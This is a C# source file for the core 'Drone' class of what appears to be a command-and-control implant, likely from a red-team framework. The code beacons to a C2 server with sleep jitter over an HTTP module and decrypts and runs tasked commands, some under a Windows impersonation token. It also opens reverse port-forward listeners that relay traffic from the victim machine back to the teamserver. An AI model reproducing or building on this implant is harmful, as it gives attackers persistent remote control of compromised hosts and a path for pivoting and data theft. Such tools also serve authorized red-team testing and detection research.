using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

using Drone.Commands;
using Drone.CommModules;
using Drone.Interfaces;

namespace Drone;

public sealed class Drone
{
    public IConfig Config { get; } = new Config();
    
    private Metadata _metadata;
    private ICommModule _commModule;
    
    private readonly CancellationTokenSource _token = new();

    private readonly List<DroneCommand> _commands = new();
    private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();
    
    private readonly List<ReversePortForwardState> _rportfwdStates = new();
    private readonly Dictionary<string, ConcurrentQueue<byte[]>> _rportfwdQueue = new();

    private readonly ConcurrentQueue<C2Frame> _outbound = new();

    public async Task Run()
    {
        // generate metadata
        _metadata = await Metadata.Generate();

        // load commands classes
        LoadCommands();

        // create comm module
        _commModule = GetCommModule();
        _commModule.Init(_metadata);
        
        // run
        while (!_token.IsCancellationRequested)
        {
            // get frames
            var inbound = await _commModule.ReadFrames();
            
            // process them
            HandleInboundFrames(inbound);
            
            // flush outbound queue
            await FlushOutboundQueue();
            
            // sleep
            var interval = Config.Get<int>(Setting.SLEEP_INTERVAL);
            var jitter = Config.Get<int>(Setting.SLEEP_JITTER);

            try
            {
                // this will throw if the token is cancelled
                await Task.Delay(Helpers.CalculateSleepTime(interval, jitter), _token.Token);
            }
            catch (TaskCanceledException)
            {
                // ignore
            }
        }
        
        _token.Dispose();
    }

    private void HandleInboundFrames(IEnumerable<C2Frame> frames)
    {
        foreach (var frame in frames)
            HandleFrame(frame);
    }

    private void HandleFrame(C2Frame frame)
    {
        switch (frame.FrameType)
        {
            case FrameType.NOP:
                break;
            
            case FrameType.CHECKIN:
                break;

            case FrameType.TASK:
            {
                var task = Crypto.Decrypt<DroneTask>(frame.Value);
                HandleTask(task);
                
                break;
            }

            case FrameType.TASK_OUTPUT:
                break;

            case FrameType.EXIT:
                break;

            case FrameType.TASK_CANCEL:
            {
                var taskId = Crypto.Decrypt<string>(frame.Value);
                CancelTask(taskId);
                
                break;
            }

            case FrameType.RPORTFWD:
            {
                var packet = Crypto.Decrypt<ReversePortForwardPacket>(frame.Value);
                HandleReversePortForwardPacket(packet);
                
                break;
            }
            
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    private void HandleTask(DroneTask task)
    {
        // get the command
        var command = _commands.FirstOrDefault(c => c.Command == task.Command);

        if (command is null)
        {
            var e = new ArgumentOutOfRangeException(nameof(command));
            SendTaskError(task.Id, e.Message);
            
            return;
        }
        
        // execute
        if (command.Threaded) ExecuteTaskThreaded(command, task);
        else ExecuteTask(command, task);
    }

    private void ExecuteTask(IDroneCommand command, DroneTask task)
    {
        try
        {
            // execute without a token
            command.Execute(task, CancellationToken.None);
        }
        catch (Exception e)
        {
            SendTaskError(task.Id, e.Message);
        }
    }

    private void ExecuteTaskThreaded(IDroneCommand command, DroneTask task)
    {
        // create a new token
        var tokenSource = new CancellationTokenSource();
        
        // add to dict
        _taskTokens.Add(task.Id, tokenSource);
        
        // get the current identity
        using var identity = ImpersonationToken == IntPtr.Zero
            ? WindowsIdentity.GetCurrent()
            : new WindowsIdentity(ImpersonationToken);
        
        // create impersonation context
        using var context = identity.Impersonate();
        
        var thread = new Thread(() =>
        {
            // wrap this in a try/catch
            try
            {
                // this blocks inside the thread
                command.Execute(task, tokenSource.Token);
            }
            catch (TaskCanceledException)
            {
                // send a task complete
                SendTaskComplete(task.Id);
            }
            catch (Exception e)
            {
                SendTaskError(task.Id, e.Message);
            }
            finally
            {
                // make sure the token is disposed and removed
                if (_taskTokens.ContainsKey(task.Id))
                {
                    _taskTokens[task.Id].Dispose();
                    _taskTokens.Remove(task.Id);
                }
            }
        });
        
        thread.Start();
    }

    public void CancelTask(string taskId)
    {
        if (!_taskTokens.ContainsKey(taskId))
            return;
        
        // cancel the token
        _taskTokens[taskId].Cancel();
    }

    private void HandleReversePortForwardPacket(ReversePortForwardPacket packet)
    {
        switch (packet.Type)
        {
            case ReversePortForwardPacket.PacketType.START:
            {
                // create new queue
                _rportfwdQueue.Add(packet.Id, new ConcurrentQueue<byte[]>());
                
                // start the forward
                HandleNewReversePortForward(packet);
                break;
            }

            case ReversePortForwardPacket.PacketType.DATA:
            {
                // queue the data
                if (_rportfwdQueue.ContainsKey(packet.Id))
                    _rportfwdQueue[packet.Id].Enqueue(packet.Data);
                
                break;
            }

            case ReversePortForwardPacket.PacketType.STOP:
            {
                var state = _rportfwdStates.Find(s => s.Id.Equals(packet.Id));
                if (state is null)
                    return;
                
                state.Dispose();

                _rportfwdStates.Remove(state);
                _rportfwdQueue.Remove(packet.Id);

                break;
            }
            
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    private void HandleNewReversePortForward(ReversePortForwardPacket packet)
    {
        var bindPort = BitConverter.ToInt32(packet.Data, 0);
        var listener = new TcpListener(new IPEndPoint(IPAddress.Any, bindPort));
        
        listener.Start(100);

        var state = new ReversePortForwardState(packet.Id, listener);
        listener.BeginAcceptSocket(ClientCallback, state);
        
        if (!_rportfwdStates.Any(s => s.Id.Equals(packet.Id)))
            _rportfwdStates.Add(state);
    }

    private void ClientCallback(IAsyncResult ar)
    {
        if (ar.AsyncState is not ReversePortForwardState state)
            return;

        try
        {
            var client = state.Listener.EndAcceptSocket(ar);
            state.ClientSocket = client;
            
            // receive from socket
            client.BeginReceive(
                state.Buffer,
                0,
                ReversePortForwardState.BufferSize,
                SocketFlags.None,
                ReceiveCallback,
                state);
        }
        catch (ObjectDisposedException)
        {
            // ignore
        }
    }

    private void ReceiveCallback(IAsyncResult ar)
    {
        if (ar.AsyncState is not ReversePortForwardState state)
            return;

        var received = state.ClientSocket.EndReceive(ar);
        if (received == 0) return;
        
        // write received into stream
        state.WriteDataToStream(received);
        
        // need to read more?
        if (received >= ReversePortForwardState.BufferSize)
        {
            state.ClientSocket.BeginReceive(
                state.Buffer,
                0,
                ReversePortForwardState.BufferSize,
                SocketFlags.None,
                ReceiveCallback,
                state);
        }
        else
        {
            // send data to TS
            var packet = new ReversePortForwardPacket
            {
                Id = state.Id,
                Type = ReversePortForwardPacket.PacketType.DATA,
                Data = state.GetStreamData()
            };

            SendC2Frame(new C2Frame(FrameType.RPORTFWD, Crypto.Encrypt(packet)));
            
            // wait for response
            byte[] outbound;
            while (!_rportfwdQueue[state.Id].TryDequeue(out outbound))
                Thread.Sleep(10);
            
            // send response
            state.ClientSocket.Send(outbound, 0, outbound.Length, SocketFlags.None);
            
            // close client connection
            state.DisconnectClient();
            
            // listen again
            state.Listener.BeginAcceptSocket(ClientCallback, state);
        }
    }

    public void SendTaskRunning(string taskId)
    {
        SendTaskOutput(new TaskOutput(taskId, TaskStatus.RUNNING));
    }

    public void SendTaskOutput(string taskId, string output)
    {
        SendTaskOutput(new TaskOutput(taskId, output));
    }

    public void SendTaskComplete(string taskId)
    {
        SendTaskOutput(new TaskOutput(taskId, TaskStatus.COMPLETE));
    }
    
    public void SendTaskError(string taskId, string error)
    {
        var taskOutput = new TaskOutput(taskId, TaskStatus.ABORTED, error);
        SendTaskOutput(taskOutput);
    }

    public void SendTaskOutput(TaskOutput output)
    {
        var frame = new C2Frame(FrameType.TASK_OUTPUT, Crypto.Encrypt(output));
        SendC2Frame(frame);
    }

    public void SendC2Frame(C2Frame frame)
    {
        _outbound.Enqueue(frame);
    }

    private async Task FlushOutboundQueue()
    {
        if (_outbound.IsEmpty)
            return;
        
        List<C2Frame> frames = new();

        while (_outbound.TryDequeue(out var frame))
            frames.Add(frame);

        await _commModule.SendFrames(frames.ToArray());
    }

    private void LoadCommands()
    {
        var self = Assembly.GetExecutingAssembly();

        foreach (var type in self.GetTypes())
        {
            if (!type.IsSubclassOf(typeof(DroneCommand)))
                continue;

            var command = (DroneCommand) Activator.CreateInstance(type);
            command.Init(this);
            
            _commands.Add(command);
        }
    }

    private IntPtr _impersonationToken;
    public IntPtr ImpersonationToken
    {
        get => _impersonationToken;
        set
        {
            // ensure the handle is closed first
            if (_impersonationToken != IntPtr.Zero)
                Interop.Methods.CloseHandle(_impersonationToken);
            
            _impersonationToken = value;
        }
    }

    public void Stop()
    {
        // send an exit frame with metadata
        _outbound.Enqueue(new C2Frame(FrameType.EXIT, Crypto.Encrypt(_metadata)));

        // cancel main token
        _token.Cancel();
    }

    private static ICommModule GetCommModule()
        => new HttpCommModule();
}